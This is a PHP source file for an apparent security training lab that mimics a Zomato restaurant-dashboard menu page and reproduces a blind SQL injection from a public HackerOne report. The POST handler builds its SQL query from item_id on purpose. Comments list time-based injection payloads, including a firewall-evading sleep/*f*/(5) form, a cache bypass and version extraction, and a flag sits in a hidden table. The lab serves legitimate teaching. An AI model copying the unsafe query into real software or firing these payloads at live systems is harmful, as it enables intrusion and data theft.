<?php
// ============================================================
// SQL Injection Lab 109 - Time-based Blind SQLi via item_id (Zomato)
// Platform: zomato.com | HackerOne Report #403616
// Vulnerability: POST parameter item_id used raw in SQL (integer, no quotes)
// WAF Bypass: inline comment /*f*/ inside function name — sleep/*f*/(5)
// Cache Bypass: increment integer prefix each request
// ============================================================

// --- Database Configuration ---
$server   = "localhost";
$username = "root";
$password = "";
$database = "KrazePlanet_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die("Connection failed: " . mysqli_connect_error());

mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

// --- Initialize Database ---
function initializeLab109Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab109_items (
        item_id INT AUTO_INCREMENT PRIMARY KEY,
        res_id INT NOT NULL,
        menu_id INT NOT NULL,
        item_name VARCHAR(100) NOT NULL,
        category VARCHAR(50) NOT NULL,
        price DECIMAL(6,2) NOT NULL,
        tags VARCHAR(200) DEFAULT ''
    )");

    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab109_secret (
        id INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");

    $check = mysqli_query($conn, "SELECT * FROM lab109_items LIMIT 1");
    if (mysqli_num_rows($check) == 0) {
        mysqli_query($conn, "INSERT INTO lab109_items (res_id, menu_id, item_name, category, price, tags) VALUES
            (1111, 10, 'Classic Burger', 'Burgers', 8.99, 'bestseller,popular'),
            (1111, 10, 'Cheese Fries', 'Sides', 3.49, 'popular'),
            (1111, 10, 'BBQ Bacon Burger', 'Burgers', 11.99, 'new'),
            (1111, 10, 'Chocolate Milkshake', 'Drinks', 4.99, ''),
            (1111, 11, 'Veggie Wrap', 'Wraps', 7.49, 'vegetarian'),
            (1111, 11, 'Spicy Chicken Sandwich', 'Sandwiches', 9.99, 'spicy,new'),
            (1111, 11, 'Onion Rings', 'Sides', 2.99, 'popular'),
            (1111, 11, 'Strawberry Smoothie', 'Drinks', 4.49, '')");
    }

    $check2 = mysqli_query($conn, "SELECT * FROM lab109_secret LIMIT 1");
    if (mysqli_num_rows($check2) == 0) {
        mysqli_query($conn, "INSERT INTO lab109_secret (secret_data) VALUES ('flag{zomato_sqli_403616}')");
    }
}
initializeLab109Database($conn);

// --- Handle POST (VULNERABLE) ---
$postResult   = null;
$postError    = null;
$execTime     = 0;
$queryRan     = false;
$postedItemId = '';
$postedResId  = '';
$postedMenuId = '';
$postedTags   = [];
$tagMessage   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['method']) && $_POST['method'] === 'add_menu_item_tags') {
    // ===================================================================
    // VULNERABLE: item_id is used directly in SQL without sanitization
    // Integer parameter — no quotes needed for injection
    //
    // WAF bypass technique (Akamai Kona bypass from report):
    //   sleep/*f*/(5)   instead of   sleep(5)
    //   mid/*f*/(version(),1,1)   instead of   mid(version(),1,1)
    //
    // Cache bypass: vary the integer prefix each request:
    //   1111-sleep/*f*/(5)
    //   1112-sleep/*f*/(5)   ← increment to avoid DB-level caching
    //
    // Payload 1 — confirm SQLi:
    //   item_id = 1111-sleep/*f*/(5)
    //
    // Payload 2 — extract DB version (TRUE branch → delay):
    //   item_id = 1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)
    //
    // Payload 3 — FALSE branch (no delay):
    //   item_id = 1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)
    // ===================================================================
    $postedItemId = $_POST['item_id'] ?? '';
    $postedResId  = $_POST['res_id']  ?? '1111';
    $postedMenuId = $_POST['menu_id'] ?? '10';
    $postedTags   = $_POST['new_tags'] ?? [];

    $start = microtime(true);
    $sql   = "SELECT * FROM lab109_items WHERE item_id = $postedItemId AND res_id = $postedResId";
    $result = mysqli_query($conn, $sql);
    $execTime = microtime(true) - $start;
    $queryRan = true;

    if ($result) {
        $rows = [];
        while ($row = mysqli_fetch_assoc($result)) {
            $rows[] = $row;
        }
        if (!empty($rows)) {
            $item = $rows[0];
            // Append tags
            if (!empty($postedTags)) {
                $newTagStr = implode(',', array_map('htmlspecialchars', $postedTags));
                $existing  = $item['tags'] ? $item['tags'] . ',' . $newTagStr : $newTagStr;
                $safeId    = (int)$item['item_id'];
                mysqli_query($conn, "UPDATE lab109_items SET tags='$existing' WHERE item_id=$safeId");
                $tagMessage = 'Tags added successfully to: ' . htmlspecialchars($item['item_name']);
            } else {
                $tagMessage = 'Item found: ' . htmlspecialchars($item['item_name']);
            }
            $postResult = $item;
        } else {
            $tagMessage = 'No item found for given item_id / res_id.';
        }
    } else {
        $postError = mysqli_error($conn);
    }
}

// --- Fetch menu items for display ---
$menuItems = [];
$res = mysqli_query($conn, "SELECT * FROM lab109_items WHERE res_id = 1111 ORDER BY menu_id, item_id");
while ($row = mysqli_fetch_assoc($res)) {
    $menuItems[] = $row;
}

$activeMenu = isset($_GET['menu']) ? (int)$_GET['menu'] : 10;
$filteredItems = array_filter($menuItems, fn($r) => $r['menu_id'] == $activeMenu);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Burger Palace — Restaurant Dashboard · Zomato for Business</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',sans-serif;background:#f5f5f5;color:#2d2d2d;min-height:100vh;display:flex;flex-direction:column;font-size:14px;}

/* ── Top Header ────────────────────────────────────────────────────────────── */
.topbar{background:#cb202d;height:52px;display:flex;align-items:center;padding:0 20px;flex-shrink:0;box-shadow:0 2px 4px rgba(0,0,0,.15);}
.topbar-logo{display:flex;align-items:center;gap:8px;text-decoration:none;margin-right:24px;}
.z-logo{font-size:1.35rem;font-weight:800;color:#fff;letter-spacing:-.03em;font-style:italic;}
.topbar-biz{font-size:.7rem;font-weight:700;color:rgba(255,255,255,.75);text-transform:uppercase;letter-spacing:.08em;border-left:1px solid rgba(255,255,255,.35);padding-left:10px;margin-left:4px;}
.topbar-nav{display:flex;gap:2px;flex:1;}
.topbar-nav a{color:rgba(255,255,255,.8);font-size:.78rem;font-weight:500;text-decoration:none;padding:6px 12px;border-radius:3px;transition:background .15s;}
.topbar-nav a:hover{background:rgba(0,0,0,.15);color:#fff;}
.topbar-nav a.active{background:rgba(0,0,0,.2);color:#fff;}
.topbar-right{display:flex;align-items:center;gap:10px;}
.topbar-restaurant{display:flex;align-items:center;gap:8px;cursor:pointer;}
.restaurant-name{color:#fff;font-size:.8rem;font-weight:600;}
.restaurant-avatar{width:30px;height:30px;border-radius:50%;background:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:800;color:#fff;}

/* ── Layout ─────────────────────────────────────────────────────────────────── */
.app-layout{display:flex;flex:1;min-height:0;}

/* ── Sidebar ────────────────────────────────────────────────────────────────── */
.sidebar{width:210px;background:#fff;border-right:1px solid #e8e8e8;flex-shrink:0;display:flex;flex-direction:column;}
.sidebar-section{padding:16px 0 8px;}
.sidebar-section-title{font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:#a0a0a0;padding:0 16px 6px;}
.sidebar-nav a{display:flex;align-items:center;gap:9px;padding:9px 16px;color:#555;text-decoration:none;font-size:.8rem;font-weight:500;transition:background .12s,color .12s;border-left:3px solid transparent;}
.sidebar-nav a:hover{background:#fef5f5;color:#cb202d;}
.sidebar-nav a.active{background:#fef5f5;color:#cb202d;border-left-color:#cb202d;font-weight:700;}
.sidebar-nav a svg{width:15px;height:15px;flex-shrink:0;}
.sidebar-restaurant-box{margin:12px;background:#fff8f8;border:1px solid #f5c6c7;border-radius:6px;padding:10px;}
.sidebar-restaurant-name{font-size:.8rem;font-weight:700;color:#2d2d2d;}
.sidebar-restaurant-meta{font-size:.68rem;color:#888;margin-top:2px;}
.sidebar-restaurant-badge{display:inline-block;background:#cb202d;color:#fff;font-size:.6rem;font-weight:700;padding:1px 5px;border-radius:2px;margin-top:4px;}

/* ── Main ───────────────────────────────────────────────────────────────────── */
.main{flex:1;padding:20px;overflow-y:auto;}
.page-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
.page-title{font-size:1.1rem;font-weight:700;color:#2d2d2d;}
.page-subtitle{font-size:.75rem;color:#888;margin-top:2px;}
.breadcrumb{font-size:.72rem;color:#888;display:flex;align-items:center;gap:5px;}
.breadcrumb a{color:#cb202d;text-decoration:none;}
.breadcrumb-sep{color:#ccc;}

/* ── Stat cards ──────────────────────────────────────────────────────────────── */
.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px;}
@media(max-width:900px){.stats-row{grid-template-columns:repeat(2,1fr);}}
.stat-card{background:#fff;border:1px solid #e8e8e8;border-radius:6px;padding:14px 16px;}
.stat-label{font-size:.68rem;font-weight:600;text-transform:uppercase;letter-spacing:.07em;color:#a0a0a0;margin-bottom:4px;}
.stat-value{font-size:1.35rem;font-weight:800;color:#2d2d2d;}
.stat-change{font-size:.68rem;margin-top:3px;}
.stat-up{color:#3ba55c;}.stat-down{color:#cb202d;}

/* ── Menu tab bar ────────────────────────────────────────────────────────────── */
.menu-tabs{display:flex;gap:0;border-bottom:2px solid #e8e8e8;margin-bottom:16px;}
.menu-tab{padding:8px 16px;font-size:.78rem;font-weight:600;color:#888;cursor:pointer;text-decoration:none;border-bottom:2px solid transparent;margin-bottom:-2px;transition:color .15s,border-color .15s;}
.menu-tab:hover{color:#cb202d;}
.menu-tab.active{color:#cb202d;border-bottom-color:#cb202d;}

/* ── Table ───────────────────────────────────────────────────────────────────── */
.card{background:#fff;border:1px solid #e8e8e8;border-radius:6px;overflow:hidden;margin-bottom:20px;}
.card-header{padding:12px 16px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;justify-content:space-between;}
.card-header-title{font-size:.85rem;font-weight:700;color:#2d2d2d;display:flex;align-items:center;gap:7px;}
.card-header-title svg{width:15px;height:15px;color:#cb202d;}
.card-body{padding:0;}
.table{width:100%;border-collapse:collapse;}
.table th{padding:9px 14px;text-align:left;font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#a0a0a0;background:#fafafa;border-bottom:1px solid #f0f0f0;}
.table td{padding:10px 14px;font-size:.78rem;color:#2d2d2d;border-bottom:1px solid #f7f7f7;vertical-align:middle;}
.table tr:last-child td{border-bottom:none;}
.table tr:hover td{background:#fef9f9;}
.tag-chip{display:inline-block;background:#fff0f0;color:#cb202d;border:1px solid #f5c6c7;border-radius:10px;padding:1px 7px;font-size:.65rem;font-weight:600;margin:1px;}
.price-cell{font-weight:700;color:#2d2d2d;}
.item-id-cell{font-family:monospace;font-size:.75rem;color:#888;}
.btn-sm{border:1px solid #e8e8e8;background:#fff;border-radius:4px;padding:4px 10px;font-size:.7rem;cursor:pointer;color:#555;font-family:inherit;transition:background .12s;}
.btn-sm:hover{background:#f5f5f5;}
.btn-sm-red{border-color:#cb202d;color:#cb202d;}
.btn-sm-red:hover{background:#fef5f5;}

/* ── Form card ───────────────────────────────────────────────────────────────── */
.form-card{background:#fff;border:1px solid #e8e8e8;border-radius:6px;overflow:hidden;margin-bottom:20px;}
.form-card-header{padding:12px 16px;background:#fafafa;border-bottom:1px solid #e8e8e8;display:flex;align-items:center;justify-content:space-between;}
.form-card-title{font-size:.85rem;font-weight:700;color:#2d2d2d;}
.endpoint-pill{font-family:monospace;font-size:.68rem;background:#fff0f0;color:#cb202d;border:1px solid #f5c6c7;border-radius:3px;padding:2px 7px;}
.form-body{padding:18px 16px;}
.form-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:14px;}
@media(max-width:700px){.form-grid{grid-template-columns:1fr 1fr;}}
.form-group{margin-bottom:0;}
.form-label{display:block;font-size:.72rem;font-weight:700;color:#555;margin-bottom:5px;}
.form-input{width:100%;padding:7px 10px;border:1.5px solid #e8e8e8;border-radius:4px;font-size:.8rem;color:#2d2d2d;background:#fff;outline:none;font-family:inherit;transition:border-color .15s;}
.form-input:focus{border-color:#cb202d;box-shadow:0 0 0 2px rgba(203,32,45,.1);}
.form-input.vuln{border-color:#f5c6c7;background:#fffafa;}
.form-input.vuln:focus{border-color:#cb202d;}
.form-hint{font-size:.65rem;color:#a0a0a0;margin-top:3px;}
.tags-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;margin-bottom:14px;}
.tag-check{display:flex;align-items:center;gap:5px;font-size:.72rem;color:#555;cursor:pointer;}
.tag-check input{accent-color:#cb202d;cursor:pointer;}
.btn-submit{background:#cb202d;color:#fff;border:none;border-radius:4px;padding:8px 22px;font-size:.8rem;font-weight:700;cursor:pointer;font-family:inherit;transition:background .15s;}
.btn-submit:hover{background:#a81b27;}
.btn-reset{background:#fff;color:#555;border:1.5px solid #e8e8e8;border-radius:4px;padding:8px 16px;font-size:.8rem;font-weight:600;cursor:pointer;font-family:inherit;margin-left:8px;}
.btn-reset:hover{background:#f5f5f5;}

/* ── Response panel ──────────────────────────────────────────────────────────── */
.response-panel{background:#1e1e1e;border-radius:6px;overflow:hidden;margin-bottom:20px;}
.response-panel-header{padding:8px 14px;background:#2d2d2d;display:flex;align-items:center;justify-content:space-between;}
.response-panel-title{color:#a0a0a0;font-size:.72rem;font-family:monospace;display:flex;align-items:center;gap:8px;}
.response-dot{width:8px;height:8px;border-radius:50%;}
.response-body{padding:14px;}
.response-line{font-family:'SFMono-Regular',Consolas,monospace;font-size:.75rem;line-height:1.8;margin-bottom:2px;}
.r-method{color:#f9a825;}.r-url{color:#81d4fa;}.r-param{color:#a5d6a7;}.r-value{color:#ef9a9a;}.r-time{color:#ffd54f;font-weight:700;}.r-ok{color:#69f0ae;}.r-err{color:#ff5252;}.r-dim{color:#5a5a5a;}.r-kw{color:#ce93d8;}

/* ── Timer display ───────────────────────────────────────────────────────────── */
.timer-box{background:#fff;border:1px solid #e8e8e8;border-radius:6px;padding:14px 16px;display:flex;align-items:center;gap:14px;margin-bottom:20px;}
.timer-icon{width:40px;height:40px;background:#fff8f8;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;border:1px solid #f5c6c7;}
.timer-icon svg{width:20px;height:20px;color:#cb202d;}
.timer-label{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#a0a0a0;}
.timer-value{font-size:1.6rem;font-weight:800;font-family:monospace;}
.timer-value.fast{color:#3ba55c;}.timer-value.medium{color:#f9a825;}.timer-value.slow{color:#cb202d;}
.timer-sub{font-size:.68rem;color:#a0a0a0;margin-top:2px;}
.result-badge{display:inline-flex;align-items:center;gap:5px;border-radius:4px;padding:5px 10px;font-size:.72rem;font-weight:600;margin-top:4px;}
.result-ok{background:#ecf9f1;color:#3ba55c;border:1px solid #b8dac8;}
.result-err{background:#fef5f5;color:#cb202d;border:1px solid #f5c6c7;}

/* ── Footer ──────────────────────────────────────────────────────────────────── */
.footer{background:#fff;border-top:1px solid #e8e8e8;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;font-size:.68rem;color:#a0a0a0;flex-shrink:0;}
.footer a{color:#a0a0a0;text-decoration:none;}
.footer a:hover{color:#cb202d;}
</style>
</head>
<body>

<!-- Top Header -->
<header class="topbar">
  <a href="index.php" class="topbar-logo">
    <span class="z-logo">zomato</span>
    <span class="topbar-biz">for business</span>
  </a>
  <nav class="topbar-nav">
    <a href="#">Dashboard</a>
    <a href="#" class="active">Menu</a>
    <a href="#">Orders</a>
    <a href="#">Reviews</a>
    <a href="#">Analytics</a>
    <a href="#">Promotions</a>
  </nav>
  <div class="topbar-right">
    <div class="topbar-restaurant">
      <div class="restaurant-avatar">B</div>
      <span class="restaurant-name">Burger Palace</span>
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.7)" stroke-width="2.5" style="margin-left:2px;"><path d="M6 9l6 6 6-6"/></svg>
    </div>
  </div>
</header>

<div class="app-layout">

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-restaurant-box">
      <div class="sidebar-restaurant-name">Burger Palace</div>
      <div class="sidebar-restaurant-meta">res_id: 1111 · Mumbai</div>
      <span class="sidebar-restaurant-badge">ACTIVE</span>
    </div>
    <div class="sidebar-section">
      <div class="sidebar-section-title">Management</div>
      <nav class="sidebar-nav">
        <a href="#">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
          Dashboard
        </a>
        <a href="index.php" class="active">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
          Menu
        </a>
        <a href="#">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/></svg>
          Orders
        </a>
        <a href="#">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
          Reviews
        </a>
        <a href="#">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>
          Analytics
        </a>
      </nav>
    </div>
    <div class="sidebar-section">
      <div class="sidebar-section-title">Settings</div>
      <nav class="sidebar-nav">
        <a href="#"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14"/></svg>Restaurant Info</a>
        <a href="#"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>Account</a>
      </nav>
    </div>
  </aside>

  <!-- Main content -->
  <main class="main">
    <div class="breadcrumb" style="margin-bottom:12px;">
      <a href="#">Home</a><span class="breadcrumb-sep">/</span>
      <a href="#">Burger Palace</a><span class="breadcrumb-sep">/</span>
      <span>Menu Management</span>
    </div>

    <div class="page-header">
      <div>
        <div class="page-title">Menu Management</div>
        <div class="page-subtitle">Manage menu items, categories, and item tags · res_id: 1111</div>
      </div>
      <button class="btn-submit" style="font-size:.75rem;padding:7px 14px;">+ Add Item</button>
    </div>

    <!-- Stats -->
    <div class="stats-row">
      <div class="stat-card">
        <div class="stat-label">Total Items</div>
        <div class="stat-value"><?= count($menuItems) ?></div>
        <div class="stat-change stat-up">↑ 2 this week</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Categories</div>
        <div class="stat-value">4</div>
        <div class="stat-change" style="color:#888;">Burgers, Sides, Drinks, Wraps</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Active Menus</div>
        <div class="stat-value">2</div>
        <div class="stat-change stat-up">menu_id: 10, 11</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Avg. Price</div>
        <div class="stat-value">$6.79</div>
        <div class="stat-change stat-up">↑ 3.2% vs last month</div>
      </div>
    </div>

    <!-- Menu item table -->
    <div class="card">
      <div class="card-header">
        <div class="card-header-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
          Menu Items
        </div>
        <div style="display:flex;gap:8px;">
          <a href="index.php?menu=10" class="menu-tab <?= $activeMenu==10?'active':'' ?>" style="text-decoration:none;">Menu #10</a>
          <a href="index.php?menu=11" class="menu-tab <?= $activeMenu==11?'active':'' ?>" style="text-decoration:none;">Menu #11</a>
        </div>
      </div>
      <div class="card-body">
        <table class="table">
          <thead>
            <tr>
              <th>item_id</th>
              <th>Item Name</th>
              <th>Category</th>
              <th>Price</th>
              <th>Tags</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <?php foreach ($filteredItems as $item): ?>
            <tr>
              <td class="item-id-cell"><?= htmlspecialchars($item['item_id']) ?></td>
              <td style="font-weight:600;"><?= htmlspecialchars($item['item_name']) ?></td>
              <td><?= htmlspecialchars($item['category']) ?></td>
              <td class="price-cell">$<?= htmlspecialchars($item['price']) ?></td>
              <td>
                <?php foreach(explode(',', $item['tags']) as $t): if(trim($t)): ?>
                  <span class="tag-chip"><?= htmlspecialchars(trim($t)) ?></span>
                <?php endif; endforeach; ?>
              </td>
              <td>
                <button class="btn-sm btn-sm-red">Edit</button>
              </td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>

    <!-- Add Tags Form — VULNERABLE ENDPOINT ─────────────────────────────────── -->
    <div class="form-card">
      <div class="form-card-header">
        <span class="form-card-title">Add Tags to Menu Item</span>
        <span class="endpoint-pill">POST /php/add_menu_item_tags</span>
      </div>
      <div class="form-body">
        <?php if ($queryRan): ?>
          <?php if ($postError): ?>
            <div style="background:#fef5f5;border:1px solid #f5c6c7;color:#cb202d;border-radius:4px;padding:9px 14px;margin-bottom:14px;font-size:.78rem;display:flex;align-items:center;gap:8px;">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
              Error: <?= htmlspecialchars($postError) ?>
            </div>
          <?php else: ?>
            <div style="background:#ecf9f1;border:1px solid #b8dac8;color:#3ba55c;border-radius:4px;padding:9px 14px;margin-bottom:14px;font-size:.78rem;display:flex;align-items:center;gap:8px;">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
              <?= htmlspecialchars($tagMessage) ?>
            </div>
          <?php endif; ?>
        <?php endif; ?>
        <form method="POST" action="index.php">
          <input type="hidden" name="method" value="add_menu_item_tags">
          <div class="form-grid">
            <div class="form-group">
              <label class="form-label" for="res_id">res_id</label>
              <input class="form-input" type="text" id="res_id" name="res_id"
                value="<?= htmlspecialchars($postedResId ?: '1111') ?>" autocomplete="off">
              <div class="form-hint">Restaurant ID</div>
            </div>
            <div class="form-group">
              <label class="form-label" for="menu_id">menu_id</label>
              <input class="form-input" type="text" id="menu_id" name="menu_id"
                value="<?= htmlspecialchars($postedMenuId ?: '10') ?>" autocomplete="off">
              <div class="form-hint">Menu ID</div>
            </div>
            <div class="form-group">
              <label class="form-label" for="item_id">item_id</label>
              <input class="form-input vuln" type="text" id="item_id" name="item_id"
                value="<?= htmlspecialchars($postedItemId ?: '1') ?>"
                placeholder="e.g. 1-sleep/*f*/(5)" autocomplete="off">
              <div class="form-hint">Menu item ID (integer parameter)</div>
            </div>
          </div>
          <div style="font-size:.72rem;font-weight:700;color:#555;margin-bottom:7px;">new_tags[]</div>
          <div class="tags-grid">
            <?php foreach(['bestseller','popular','new','spicy','vegetarian','gluten-free','must-try','trending','chef-special','limited'] as $t): ?>
            <label class="tag-check">
              <input type="checkbox" name="new_tags[]" value="<?= $t ?>"
                <?= in_array($t, $postedTags) ? 'checked' : '' ?>>
              <?= $t ?>
            </label>
            <?php endforeach; ?>
          </div>
          <div style="display:flex;align-items:center;gap:8px;">
            <button class="btn-submit" type="submit">Add Tags</button>
            <button class="btn-reset" type="reset">Reset</button>
          </div>
        </form>
      </div>
    </div>


  </main>
</div>

<footer class="footer">
  <span>© <?= date('Y') ?> Zomato Media Pvt. Ltd. · Burger Palace · res_id: 1111</span>
  <span>
    <a href="https://hackerone.com/reports/403616" target="_blank">HackerOne Report #403616</a>
    &nbsp;·&nbsp;<a href="#">Terms</a>
    &nbsp;·&nbsp;<a href="#">Privacy</a>
  </span>
</footer>

</body>
</html>
